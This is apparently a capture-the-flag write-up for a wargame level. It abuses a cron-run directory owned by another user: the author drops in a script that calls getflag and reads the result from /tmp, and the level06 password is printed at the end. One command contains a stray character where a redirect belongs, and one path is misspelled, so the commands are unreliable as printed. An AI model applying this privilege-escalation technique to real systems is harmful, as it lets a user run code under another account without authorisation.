When we log as level05 we get a message saying: `You have new mail`

Searching we find the directory `/var/mail/level05`

We find what looks like a cron file and it says that every 2 minutes `/user/sbin/openareanserver` is executed

Let’s check that executable to see who owns i

```jsx
ls -la /usr/sbin/openarenaserver
```

As expected, it’s owned by flag05, so let’s see what it does.

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

It execute everything in `/opt/openarenaserver` directory so lets put a `.sh` file there to get the flag

```bash
echo "/bin/getflag ª /tmp/file.txt" > /opt/openarenaserver/file.sh
```

Wait for 2 minutes max and check the file

```bash
cat /tmp/file.txt
```

There is the password so lets go on

```bash
su level06
password viuaaale9huek52boumoomioc
```